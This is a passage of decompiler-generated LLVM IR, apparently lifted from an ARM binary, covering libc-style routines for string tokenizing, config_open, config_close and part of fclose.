dec_label_pc_15a74:                               ; preds = %dec_label_pc_15a50, %dec_label_pc_15a70
  %v0_15a74 = phi i32 [ %v1_15a70, %dec_label_pc_15a70 ], [ %v5_15a58, %dec_label_pc_15a50 ]
  %v1_15a74 = add i32 %v0_15a74, -1
  %v2_15a74 = inttoptr i32 %v1_15a74 to i8*
  %v3_15a74 = load i8, i8* %v2_15a74, align 1
  %v4_15a74 = zext i8 %v3_15a74 to i32
  %v0_15a78 = load i32, i32* @sl, align 4
  store i32 %v0_15a78, i32* @r0, align 4
  %v2_15a7c = call i32 @__GI_strchr(i32 %v0_15a78, i32 %v4_15a74)
  store i32 %v2_15a7c, i32* %r0.global-to-local, align 4
  %v2_15a80 = icmp eq i32 %v2_15a7c, 0
  store i1 %v2_15a80, i1* %cpsr_z.global-to-local, align 1
  %v0_15a88.pre = load i32, i32* @r4, align 4
  br i1 %v2_15a80, label %dec_label_pc_15a88, label %dec_label_pc_15a70

dec_label_pc_15a88:                               ; preds = %dec_label_pc_15a74, %dec_label_pc_15a50, %dec_label_pc_15a30
  %v3_15a94 = phi i32 [ %v5_15a58, %dec_label_pc_15a50 ], [ %v2_15a48, %dec_label_pc_15a30 ], [ %v0_15a88.pre, %dec_label_pc_15a74 ]
  %v1_15a88 = inttoptr i32 %v3_15a94 to i8*
  %v2_15a88 = load i8, i8* %v1_15a88, align 1
  %v3_15a88 = zext i8 %v2_15a88 to i32
  store i32 %v3_15a88, i32* %r2.global-to-local, align 4
  %v0_15a8c = load i32, i32* @r7, align 4
  %v1_15a8c = inttoptr i32 %v0_15a8c to i8*
  %v2_15a8c = load i8, i8* %v1_15a8c, align 1
  %v3_15a8c = zext i8 %v2_15a8c to i32
  store i32 %v3_15a8c, i32* %r3.global-to-local, align 4
  %v9_15a90 = icmp eq i8 %v2_15a8c, %v2_15a88
  store i1 %v9_15a90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15a90, label %bb69, label %dec_label_pc_15a9c

bb69:                                             ; preds = %dec_label_pc_15a88
  %v1_15a94 = load i32, i32* @fp, align 4
  %v2_15a94 = trunc i32 %v1_15a94 to i8
  store i8 %v2_15a94, i8* %v1_15a88, align 1
  %v0_15a98.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15a98.pr, label %bb71, label %.dec_label_pc_15a9c_crit_edge

.dec_label_pc_15a9c_crit_edge:                    ; preds = %bb69
  %v0_15a9c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15a9c

dec_label_pc_15a9c:                               ; preds = %.dec_label_pc_15a9c_crit_edge, %dec_label_pc_15a88
  %v0_15a9c = phi i32 [ %v0_15a9c.pre, %.dec_label_pc_15a9c_crit_edge ], [ %v3_15a88, %dec_label_pc_15a88 ]
  %v2_15a9c = icmp eq i32 %v0_15a9c, 0
  store i1 %v2_15a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a9c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_15a9c
  %v1_15aa0 = load i32, i32* @fp, align 4
  %v2_15aa0 = trunc i32 %v1_15aa0 to i8
  %v3_15aa0 = load i32, i32* @r4, align 4
  %v4_15aa0 = inttoptr i32 %v3_15aa0 to i8*
  store i8 %v2_15aa0, i8* %v4_15aa0, align 1
  %v5_15aa0 = load i32, i32* @r4, align 4
  %v6_15aa0 = add i32 %v5_15aa0, 1
  store i32 %v6_15aa0, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_15a9c, %bb70
  %v2_15aa4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15aa4, i32* %r3.global-to-local, align 4
  %v2_15aa8 = icmp eq i32 %v2_15aa4, 0
  store i1 %v2_15aa8, i1* %cpsr_z.global-to-local, align 1
  %v0_15ac4.pre = load i32, i32* @r4, align 4
  br i1 %v2_15aa8, label %dec_label_pc_15ac0, label %dec_label_pc_15ab0

dec_label_pc_15ab0:                               ; preds = %bb71
  store i32 %v0_15ac4.pre, i32* @r0, align 4
  %v0_15ab4 = load i32, i32* @sl, align 4
  %v2_15ab8 = inttoptr i32 %v0_15ac4.pre to i8*
  %v3_15ab8 = call i32 @__GI_strspn(i8* %v2_15ab8, i32 %v0_15ab4)
  store i32 %v3_15ab8, i32* %r0.global-to-local, align 4
  %v0_15abc = load i32, i32* @r4, align 4
  %v2_15abc = add i32 %v0_15abc, %v3_15ab8
  store i32 %v2_15abc, i32* @r4, align 4
  br label %dec_label_pc_15ac0

dec_label_pc_15ac0:                               ; preds = %bb71, %dec_label_pc_15ab0
  %v0_15ac4 = phi i32 [ %v2_15abc, %dec_label_pc_15ab0 ], [ %v0_15ac4.pre, %bb71 ]
  %v0_15ac0 = load i32, i32* @r6, align 4
  %v1_15ac0 = add i32 %v0_15ac0, 1
  store i32 %v1_15ac0, i32* @r6, align 4
  %v1_15ac4 = inttoptr i32 %v0_15ac4 to i8*
  %v2_15ac4 = load i8, i8* %v1_15ac4, align 1
  %v3_15ac4 = zext i8 %v2_15ac4 to i32
  store i32 %v3_15ac4, i32* %r2.global-to-local, align 4
  %v2_15ac8 = icmp eq i8 %v2_15ac4, 0
  store i1 %v2_15ac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ac8, label %dec_label_pc_15ae0, label %dec_label_pc_15ad0

dec_label_pc_15ad0:                               ; preds = %dec_label_pc_159ec, %dec_label_pc_15ac0
  %v0_15a1c = phi i32 [ %v0_15ac4, %dec_label_pc_15ac0 ], [ %v0_15ac412, %dec_label_pc_159ec ]
  %v2_15a1c = phi i32 [ %v1_15ac0, %dec_label_pc_15ac0 ], [ %v0_15a04, %dec_label_pc_159ec ]
  %v1_15ad4 = phi i32 [ %v3_15ac4, %dec_label_pc_15ac0 ], [ %v3_15ac415, %dec_label_pc_159ec ]
  %v0_15ad0 = load i32, i32* @r7, align 4
  %v1_15ad0 = inttoptr i32 %v0_15ad0 to i8*
  %v2_15ad0 = load i8, i8* %v1_15ad0, align 1
  %v3_15ad0 = zext i8 %v2_15ad0 to i32
  store i32 %v3_15ad0, i32* %r3.global-to-local, align 4
  %v9_15ad4 = icmp eq i32 %v3_15ad0, %v1_15ad4
  store i1 %v9_15ad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15ad4, label %dec_label_pc_15ae0, label %bb72

bb72:                                             ; preds = %dec_label_pc_15ad0
  %v2_15ad8 = load i32, i32* @sb, align 4
  %v3_15ad8 = sub i32 %v2_15a1c, %v2_15ad8
  %v5_15ad8 = xor i32 %v2_15ad8, %v2_15a1c
  %v6_15ad8 = xor i32 %v3_15ad8, %v2_15a1c
  %v7_15ad8 = and i32 %v6_15ad8, %v5_15ad8
  %v8_15ad8 = icmp slt i32 %v7_15ad8, 0
  %v9_15ad8 = icmp slt i32 %v3_15ad8, 0
  %v10_15ad8 = icmp eq i32 %v2_15a1c, %v2_15ad8
  store i1 %v10_15ad8, i1* %cpsr_z.global-to-local, align 1
  %v2_15adc = xor i1 %v9_15ad8, %v8_15ad8
  br i1 %v2_15adc, label %dec_label_pc_15a0c, label %dec_label_pc_15ae0

dec_label_pc_15ae0:                               ; preds = %dec_label_pc_15ad0, %dec_label_pc_15ac0, %bb72, %dec_label_pc_159ec
  %v0_15ae4 = phi i32 [ %v0_15a04, %dec_label_pc_159ec ], [ %v2_15a1c, %dec_label_pc_15ad0 ], [ %v1_15ac0, %dec_label_pc_15ac0 ], [ %v2_15a1c, %bb72 ]
  store i32 %v3_15804, i32* %r2.global-to-local, align 4
  %v9_15ae4 = icmp eq i32 %v0_15ae4, %v3_15804
  store i1 %v9_15ae4, i1* %cpsr_z.global-to-local, align 1
  %v6_15ae8 = icmp slt i32 %v0_15ae4, %v3_15804
  br i1 %v6_15ae8, label %dec_label_pc_15aec, label %dec_label_pc_15af8

dec_label_pc_15aec:                               ; preds = %dec_label_pc_15ae0
  %v0_15aec = load i32, i32* @r8, align 4
  %v1_15aec = and i32 %v0_15aec, 1048576
  %v2_15aec = icmp eq i32 %v1_15aec, 0
  store i1 %v2_15aec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15aec, label %dec_label_pc_15844.backedge, label %dec_label_pc_15af4

dec_label_pc_15af4:                               ; preds = %dec_label_pc_15aec, %dec_label_pc_159ac, %.thread, %entry
  br label %dec_label_pc_15af8

dec_label_pc_15af8:                               ; preds = %dec_label_pc_15ae0, %dec_label_pc_158c8, %dec_label_pc_15af4
  %v0_15af8 = phi i32 [ %v0_158d8, %dec_label_pc_158c8 ], [ 0, %dec_label_pc_15af4 ], [ %v0_15ae4, %dec_label_pc_15ae0 ]
  store i32 %v0_15af8, i32* %r0.global-to-local, align 4
  store i32 %v3_157e0, i32* @r4, align 4
  store i32 %v6_157e0, i32* @r5, align 4
  store i32 %v9_157e0, i32* @r6, align 4
  store i32 %v12_157e0, i32* @r7, align 4
  store i32 %v15_157e0, i32* @r8, align 4
  store i32 %v18_157e0, i32* @sb, align 4
  store i32 %v21_157e0, i32* @sl, align 4
  store i32 %v24_157e0, i32* @fp, align 4
  ret i32 %v0_15af8

; uselistorder directives
  uselistorder i32 %v0_15af8, { 1, 0 }
  uselistorder i32 %v0_15ae4, { 0, 2, 1 }
  uselistorder i32 %v3_15ad8, { 1, 0 }
  uselistorder i32 %v2_15ad8, { 1, 0, 2 }
  uselistorder i32 %v2_15a1c, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_15ac4.pre, { 0, 2, 1 }
  uselistorder i32 %v5_15a58, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15a04, { 1, 0, 2 }
  uselistorder i1 %v9_159e4, { 1, 0 }
  uselistorder i32 %v3_159bc, { 0, 2, 1, 3 }
  uselistorder i1 %v7_159ac, { 1, 0 }
  uselistorder i1 %v8_159a4, { 1, 0 }
  uselistorder i32 %v3_15974, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_15964, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_1594c, { 1, 0, 2 }
  uselistorder i32 %v1_1593c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15928, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15920, { 1, 0 }
  uselistorder i32 %v1_1590c, { 1, 0 }
  uselistorder i32 %v1_15908, { 1, 0 }
  uselistorder i32 %v2_158e4, { 1, 0 }
  uselistorder i32 %v1_158c8, { 2, 0, 1 }
  uselistorder i32 %v0_158b0, { 1, 0 }
  uselistorder i32 %v1_158a0, { 0, 2, 1 }
  uselistorder i32* %v1_15a10, { 1, 0 }
  uselistorder i1 %v2_159b8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1582c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15820, { 2, 1, 0 }
  uselistorder i32 %v3_15808, { 1, 2, 0 }
  uselistorder i32 %v3_15804, { 2, 1, 0 }
  uselistorder i32 %v1_157fc, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 2, 1, 3, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15af8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15ae0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15ad0, { 1, 0 }
  uselistorder label %dec_label_pc_15ac0, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a74, { 1, 0 }
  uselistorder label %dec_label_pc_15844.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_159d4, { 1, 0 }
  uselistorder label %dec_label_pc_159ac, { 1, 0 }
  uselistorder label %dec_label_pc_159a0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15964, { 1, 0 }
  uselistorder label %dec_label_pc_15898, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15b0c = icmp eq i32* %arg1, null
  br i1 %v2_15b0c, label %dec_label_pc_15b34, label %dec_label_pc_15b14

dec_label_pc_15b14:                               ; preds = %entry
  %v2_15b14 = load i32, i32* %arg1, align 4
  %v1_15b18 = inttoptr i32 %v2_15b14 to i16*
  %v2_15b18 = call i32 @__GI_fclose(i16* %v1_15b18)
  %v0_15b1c = load i32, i32* @r4, align 4
  %v1_15b1c = add i32 %v0_15b1c, 20
  %v2_15b1c = inttoptr i32 %v1_15b1c to i32*
  %v3_15b1c = load i32, i32* %v2_15b1c, align 4
  %v2_15b20 = icmp eq i32 %v3_15b1c, 0
  br i1 %v2_15b20, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15b14
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15b14, %bb
  store i32 88876, i32* @lr, align 4
  %v1_15b28 = xor i1 %v2_15b20, true
  call void @__pseudo_cond_branch(i1 %v1_15b28, i32 ptrtoint (i32* @global_var_131f4.32 to i32))
  %v0_15b2c = load i32, i32* @r4, align 4
  store i32 %v0_15b2c, i32* @r0, align 4
  %v0_15b30 = call i32 @free()
  br label %dec_label_pc_15b34

dec_label_pc_15b34:                               ; preds = %entry, %bb6
  %v1_15b38 = phi i32 [ 0, %entry ], [ %v0_15b30, %bb6 ]
  ret i32 %v1_15b38

; uselistorder directives
  uselistorder label %dec_label_pc_15b34, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15b48 = load i32, i32* @r4, align 4
  store i32 %v3_15b48, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 -34420), i32* @r1, align 4
  %v0_15b50 = call i32 @__GI_fopen()
  store i32 %v0_15b50, i32* %r0.global-to-local, align 4
  store i32 %v0_15b50, i32* @r4, align 4
  %v2_15b54 = icmp eq i32 %v0_15b50, 0
  br i1 %v2_15b54, label %bb, label %dec_label_pc_15b60

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_15b60:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15b68 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_15b68, i32* %r0.global-to-local, align 4
  %v2_15b6c = icmp eq i32 %v2_15b68, 0
  br i1 %v2_15b6c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_15b60
  %v1_15b70 = load i32, i32* @r4, align 4
  %v3_15b70 = inttoptr i32 %v2_15b68 to i32*
  store i32 %v1_15b70, i32* %v3_15b70, align 4
  %v1_15b78.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_15b60, %bb4
  %v1_15b78 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_15b60 ], [ %v1_15b78.pre, %bb4 ]
  %v2_15b74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15b74, i32* @r4, align 4
  ret i32 %v1_15b78

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 41, 38, 39, 40, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 0, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15b84 = load i32, i32* @r4, align 4
  store i32 %v3_15b84, i32* %stack_var_-36, align 4
  %v6_15b84 = load i32, i32* @r5, align 4
  %v9_15b84 = load i32, i32* @r6, align 4
  %v12_15b84 = load i32, i32* @r7, align 4
  %v2_15b88 = add i32 %tmp, 52
  %v3_15b88 = inttoptr i32 %v2_15b88 to i32*
  %v4_15b88 = load i32, i32* %v3_15b88, align 4
  store i32 %v4_15b88, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15b90 = icmp eq i32 %v4_15b88, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r8, align 4
  br i1 %v2_15b90, label %dec_label_pc_15ba4, label %dec_label_pc_15c08

dec_label_pc_15ba4:                               ; preds = %entry
  %v0_15ba4 = call i32 @__aeabi_read_tp()
  store i32 %v0_15ba4, i32* %r0.global-to-local, align 4
  %v0_15ba8 = load i32, i32* @r5, align 4
  %v1_15ba8 = add i32 %v0_15ba8, 64
  %v2_15ba8 = inttoptr i32 %v1_15ba8 to i32*
  %v3_15ba8 = load i32, i32* %v2_15ba8, align 4
  store i32 %v3_15ba8, i32* %r3.global-to-local, align 4
  %v1_15bac = add i32 %v0_15ba4, -1168
  store i32 %v1_15bac, i32* @r6, align 4
  %v3_15bb0 = icmp uge i32 %v3_15ba8, %v1_15bac
  store i1 %v3_15bb0, i1* %cpsr_c.global-to-local, align 1
  %v9_15bb0 = icmp eq i32 %v3_15ba8, %v1_15bac
  br i1 %v9_15bb0, label %dec_label_pc_15bfc, label %dec_label_pc_15bb8

dec_label_pc_15bb8:                               ; preds = %dec_label_pc_15ba4
  %v1_15bb8 = add i32 %v0_15ba8, 56
  store i32 %v1_15bb8, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_15bb8, i32* %r2.global-to-local, align 4
  %v0_15bc4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15bc4, i32* @r4, align 4
  %v1_15bc8115 = inttoptr i32 %v1_15bb8 to i32*
  %v2_15bc8116 = load i32, i32* %v1_15bc8115, align 4
  store i32 %v2_15bc8116, i32* %r3.global-to-local, align 4
  %v3_15bcc118 = icmp uge i32 %v2_15bc8116, %v0_15bc4
  store i1 %v3_15bcc118, i1* %cpsr_c.global-to-local, align 1
  %v9_15bcc124 = icmp eq i32 %v2_15bc8116, %v0_15bc4
  br i1 %v9_15bcc124, label %dec_label_pc_15bd4, label %dec_label_pc_15bec

dec_label_pc_15bd4:                               ; preds = %dec_label_pc_15bb8, %dec_label_pc_15bd4.dec_label_pc_15bc8_crit_edge
  %v0_15bd4125 = phi i32 [ %v1_15bcc.pre, %dec_label_pc_15bd4.dec_label_pc_15bc8_crit_edge ], [ %v0_15bc4, %dec_label_pc_15bb8 ]
  store i32 %v0_15bd4125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15be4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15be4, label %dec_label_pc_15be8, label %dec_label_pc_15bd4.dec_label_pc_15bc8_crit_edge

dec_label_pc_15bd4.dec_label_pc_15bc8_crit_edge:  ; preds = %dec_label_pc_15bd4
  %v0_15bc8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15bcc.pre = load i32, i32* @r4, align 4
  %v1_15bc8 = inttoptr i32 %v0_15bc8.pre to i32*
  %v2_15bc8 = load i32, i32* %v1_15bc8, align 4
  store i32 %v2_15bc8, i32* %r3.global-to-local, align 4
  %v3_15bcc = icmp uge i32 %v2_15bc8, %v1_15bcc.pre
  store i1 %v3_15bcc, i1* %cpsr_c.global-to-local, align 1
  %v9_15bcc = icmp eq i32 %v2_15bc8, %v1_15bcc.pre
  br i1 %v9_15bcc, label %dec_label_pc_15bd4, label %dec_label_pc_15bec

dec_label_pc_15be8:                               ; preds = %dec_label_pc_15bd4
  %v0_15be8 = load i32, i32* @r4, align 4
  store i32 %v0_15be8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15bec

dec_label_pc_15bec:                               ; preds = %dec_label_pc_15bb8, %dec_label_pc_15bd4.dec_label_pc_15bc8_crit_edge, %dec_label_pc_15be8
  %v0_15bec = phi i32 [ %v0_15be8, %dec_label_pc_15be8 ], [ %v2_15bc8116, %dec_label_pc_15bb8 ], [ %v2_15bc8, %dec_label_pc_15bd4.dec_label_pc_15bc8_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15bec = icmp eq i32 %v0_15bec, 0
  br i1 %v2_15bec, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_15bec
  %v1_15bf0 = load i32, i32* @r7, align 4
  store i32 %v1_15bf0, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_15bec, %bb
  %v1_15bf4 = xor i1 %v2_15bec, true
  call void @__pseudo_cond_branch(i1 %v1_15bf4, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_15bf8 = load i32, i32* @r6, align 4
  %v1_15bf8 = load i32, i32* @r5, align 4
  %v2_15bf8 = add i32 %v1_15bf8, 64
  %v3_15bf8 = inttoptr i32 %v2_15bf8 to i32*
  store i32 %v0_15bf8, i32* %v3_15bf8, align 4
  %v0_15bfc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15bfc

dec_label_pc_15bfc:                               ; preds = %dec_label_pc_15ba4, %bb41
  %v0_15bfc = phi i32 [ %v0_15ba8, %dec_label_pc_15ba4 ], [ %v0_15bfc.pre, %bb41 ]
  %v1_15bfc = add i32 %v0_15bfc, 60
  %v2_15bfc = inttoptr i32 %v1_15bfc to i32*
  %v3_15bfc = load i32, i32* %v2_15bfc, align 4
  %v1_15c00 = add i32 %v3_15bfc, 1
  store i32 %v1_15c00, i32* %r3.global-to-local, align 4
  store i32 %v1_15c00, i32* %v2_15bfc, align 4
  %v0_15c08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c08

dec_label_pc_15c08:                               ; preds = %entry, %dec_label_pc_15bfc
  %v1_15c10 = phi i32 [ %tmp, %entry ], [ %v0_15c08.pre, %dec_label_pc_15bfc ]
  %v1_15c08 = inttoptr i32 %v1_15c10 to i16*
  %v2_15c08 = load i16, i16* %v1_15c08, align 2
  %v3_15c08 = zext i16 %v2_15c08 to i32
  store i32 %v3_15c08, i32* %r3.global-to-local, align 4
  %v1_15c0c = and i32 %v3_15c08, 64
  %v2_15c0c = icmp eq i32 %v1_15c0c, 0
  br i1 %v2_15c0c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_15c08
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_15c08, %bb42
  %storemerge = phi i32 [ %v1_15c10, %bb42 ], [ %v1_15c0c, %dec_label_pc_15c08 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 89112, i32* @lr, align 4
  %v1_15c14 = xor i1 %v2_15c0c, true
  call void @__pseudo_cond_branch(i1 %v1_15c14, i32 ptrtoint (i32* @global_var_16a58.601 to i32))
  %v0_15c18 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15c18, i32* %fp.global-to-local, align 4
  %v0_15c1c = load i32, i32* @r5, align 4
  %v1_15c1c = add i32 %v0_15c1c, 4
  %v2_15c1c = inttoptr i32 %v1_15c1c to i32*
  %v3_15c1c = load i32, i32* %v2_15c1c, align 4
  store i32 %v3_15c1c, i32* %r0.global-to-local, align 4
  %v1_15c20 = call i32 @__GI___libc_close(i32 %v3_15c1c)
  store i32 %v1_15c20, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15c28 = load i32, i32* @r8, align 4
  %v2_15c28 = add i32 %v0_15c28, 160
  %v3_15c28 = inttoptr i32 %v2_15c28 to i32*
  %v4_15c28 = load i32, i32* %v3_15c28, align 4
  store i32 %v4_15c28, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15c2c = icmp slt i32 %v1_15c20, 0
  br i1 %v1_15c2c, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_15c34 = add i32 %v4_15c28, 8
  %v2_15c34 = inttoptr i32 %v1_15c34 to i32*
  %v3_15c34 = load i32, i32* %v2_15c34, align 4
  store i32 %v3_15c34, i32* %r3.global-to-local, align 4
  %v0_15c38 = call i32 @__aeabi_read_tp()
  store i32 %v0_15c38, i32* %r0.global-to-local, align 4
  %v1_15c3c = add i32 %v0_15c38, -1168
  store i32 %v1_15c3c, i32* %sl.global-to-local, align 4
  %v0_15c40 = load i32, i32* %r3.global-to-local, align 4
  %v3_15c40 = icmp uge i32 %v0_15c40, %v1_15c3c
  store i1 %v3_15c40, i1* %cpsr_c.global-to-local, align 1
  %v9_15c40 = icmp eq i32 %v0_15c40, %v1_15c3c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_15c48 = load i32, i32* @r5, align 4
  %v2_15c48 = add i32 %v1_15c48, 4
  %v3_15c48 = inttoptr i32 %v2_15c48 to i32*
  store i32 -1, i32* %v3_15c48, align 4
  br i1 %v9_15c40, label %dec_label_pc_15c90, label %dec_label_pc_15c50

dec_label_pc_15c50:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_15c54 = load i32, i32* @r7, align 4
  store i32 %v0_15c54, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_15c5c108 = inttoptr i32 %v0_15c54 to i32*
  %v2_15c5c109 = load i32, i32* %v1_15c5c108, align 4
  store i32 %v2_15c5c109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15c60111 = icmp eq i32 %v2_15c5c109, 0
  br i1 %v9_15c60111, label %dec_label_pc_15c68, label %dec_label_pc_15c80

dec_label_pc_15c68:                               ; preds = %dec_label_pc_15c50, %dec_label_pc_15c68.dec_label_pc_15c5c_crit_edge
  %v0_15c68112 = phi i32 [ %v1_15c60.pre, %dec_label_pc_15c68.dec_label_pc_15c5c_crit_edge ], [ 0, %dec_label_pc_15c50 ]
  store i32 %v0_15c68112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15c78 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15c78, label %dec_label_pc_15c7c, label %dec_label_pc_15c68.dec_label_pc_15c5c_crit_edge

dec_label_pc_15c68.dec_label_pc_15c5c_crit_edge:  ; preds = %dec_label_pc_15c68
  %v0_15c5c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15c60.pre = load i32, i32* @r4, align 4
  %v1_15c5c = inttoptr i32 %v0_15c5c.pre to i32*
  %v2_15c5c = load i32, i32* %v1_15c5c, align 4
  store i32 %v2_15c5c, i32* %r3.global-to-local, align 4
  %v3_15c60 = icmp uge i32 %v2_15c5c, %v1_15c60.pre
  store i1 %v3_15c60, i1* %cpsr_c.global-to-local, align 1
  %v9_15c60 = icmp eq i32 %v2_15c5c, %v1_15c60.pre
  br i1 %v9_15c60, label %dec_label_pc_15c68, label %dec_label_pc_15c80

dec_label_pc_15c7c:                               ; preds = %dec_label_pc_15c68
  %v0_15c7c = load i32, i32* @r4, align 4
  store i32 %v0_15c7c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15c80

dec_label_pc_15c80:                               ; preds = %dec_label_pc_15c50, %dec_label_pc_15c68.dec_label_pc_15c5c_crit_edge, %dec_label_pc_15c7c
  %v0_15c80 = phi i32 [ %v0_15c7c, %dec_label_pc_15c7c ], [ %v2_15c5c109, %dec_label_pc_15c50 ], [ %v2_15c5c, %dec_label_pc_15c68.dec_label_pc_15c5c_crit_edge ]
  %v1_15c80 = phi i32 [ %v0_15c7c, %dec_label_pc_15c7c ], [ 0, %dec_label_pc_15c50 ], [ %v1_15c60.pre, %dec_label_pc_15c68.dec_label_pc_15c5c_crit_edge ]
  %v3_15c80 = icmp uge i32 %v0_15c80, %v1_15c80
  store i1 %v3_15c80, i1* %cpsr_c.global-to-local, align 1
  %v9_15c80 = icmp eq i32 %v0_15c80, %v1_15c80
  br i1 %v9_15c80, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_15c80
